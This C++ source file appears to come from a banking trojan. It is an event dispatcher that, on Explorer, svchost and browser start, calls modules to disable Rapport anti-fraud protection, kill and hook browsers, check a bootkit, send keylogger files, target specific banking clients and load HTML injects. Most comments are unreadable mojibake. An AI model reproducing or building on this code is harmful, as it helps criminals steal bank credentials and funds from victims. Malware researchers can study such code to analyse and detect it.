//---------------------------------------------------------------------------

#include "BotEvents.h"
#include "GetApi.h"
#include "Strings.h"
#include "Utils.h"
#include "Loader.h"
#include "Pipes.h"

#include "Modules.h"


//---------------------------------------------------------------------------

//extern bool ExecuteLoadDLLDisk(LPVOID, PCHAR Command, PCHAR Args);
extern bool ExecuteDocFind(LPVOID, PCHAR Command, PCHAR Args);

void ExplorerFirstStart(PEventData Data)
{
	#ifdef antirapportH
		AntiRapport();
	#endif
	
	#ifdef AvangardH
		AvangardWeb::SendFolder_avn_ib();
	#endif
	
	//ExecuteDocFind( 0, 0, 0 );
	//ExecuteLoadDLLDisk( 0, 0, "testdll.dll" );
	// ������ ������ ���� � ����������

	// ��������� �������� �������
	/* #ifdef coocksolH
		StartDeleteCookiesThread();
    #endif */
}
//---------------------------------------------------------------------------


void ExplorerStart(PEventData Data)
{

	KillAllBrowsers();


	#ifdef BBSCBankH
		RunThreadBBS();
	#endif

	#ifdef JAVS_PATCHERH
		StartThread(Run_Path,NULL);
	#endif

	// ������ ���������� WinInet
	#ifdef InternetExplorerH
		HookInternetExplorer();
	#endif

	// ��������� ������ ���������
	#ifdef KeepAliveH
		KeepAliveCheckProcess(PROCESS_SVCHOST);
	#endif


	// ��������� ������� ���������
	#ifdef CyberPlatDLLH
		CyberPlatCheckInstalled(); 
	#endif

	#ifdef CmdLineH
		HookCmdLine();
	#endif

    // ��������� ������ �����������
	#ifdef VideoRecorderH
		VideoRecorderSrv::Start();
	#endif


	#ifdef BOTMONITOR
    	PIPE::CreateProcessPipe((PCHAR)BotMonitor::ProcessExplorer, true);
	#endif

	// ������ ������ �������� ��������.
	// �����! ����� ������ ���������� � ��������� �������
	#ifdef StealthBrowserH
		HANDLE H = StartThread( RunIeSB/*SellExecute*/, NULL );// ��������� ����� ����������� �� ������ ��������
		pWaitForSingleObject(H, INFINITE);
	#endif

}
//---------------------------------------------------------------------------

void SVChostStart(PEventData Data, bool &Cancel)
{
	// �������� ������� ���������� � �������� svchost

	#ifdef bootkitH
		IsBootkitInstaled();
	#endif


	#ifdef KeepAliveH
		// �������������� ������ ���������
		KeepAliveInitializeProcess(PROCESS_SVCHOST);
	#endif

	//�������� ����� �������� ��������� ������ ��� �������� ����������
	#ifdef KeyLoggerH	
		SendLoadedFiles();
	#endif

		//������ ������� �� ������� , ��������� ��� � 15 ��� ���� �������� �������,�� ��������� ������� SB
		// �������������� ������� �������� �������� �� ��������
	#ifdef HunterH
		URLHunter::StartClient();
	#endif

	#ifdef BOTMONITOR
    	PIPE::CreateProcessPipe((PCHAR)BotMonitor::ProcessLoader, true);
	#endif
}
//---------------------------------------------------------------------------

void InternetExplorerStarted(PEventData Data)
{
	// ������� Internet Explorer. ��������� ����� ������� � ������� ��������

}
//---------------------------------------------------------------------------


void FireFoxStarted(PEventData Data)
{
	// ������� �������. ��������� ����� ������� � ������� ��������

}
//---------------------------------------------------------------------------

void BrowserStarted(PEventData Data)
{
	// ������� ��������� �������. ��������� ����� ������� � ������� ��������
	#ifdef HTMLSendH
		InitHTMLSendHandlers();
	#endif;

	#ifdef AzConfigH
		AzInizializeHTMLInjects();
	#endif

}
//---------------------------------------------------------------------------

void ApplicationStarted(PEventData Data)
{
	// �������� ����������� ����������

}
//---------------------------------------------------------------------------

